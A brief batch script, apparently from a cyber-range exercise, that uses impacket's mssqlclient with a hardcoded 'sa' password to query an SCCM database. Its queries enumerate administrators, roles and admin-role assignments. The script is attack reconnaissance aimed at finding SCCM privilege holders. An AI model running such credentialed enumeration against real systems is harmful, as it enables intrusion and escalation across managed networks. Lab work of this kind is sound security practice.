@echo off
REM Query SCCM DB as sa — analyst_t1 (ws01 ATTACK)
python -m impacket.examples.mssqlclient -db CM_CAD "sa:s@_P@ssw0rd!L@b!@mbr02.range.local" -no-pass -query "SELECT AdminID, LogonName, IsGroup FROM SMS_Admin" -batch
echo ===ROLES===
python -m impacket.examples.mssqlclient -db CM_CAD "sa:s@_P@ssw0rd!L@b!@mbr02.range.local" -no-pass -query "SELECT RoleID, RoleName FROM SMS_Role" -batch
echo ===ADMINROLE===
python -m impacket.examples.mssqlclient -db CM_CAD "sa:s@_P@ssw0rd!L@b!@mbr02.range.local" -no-pass -query "SELECT * FROM SMS_AdminRole" -batch
echo ===DONE===
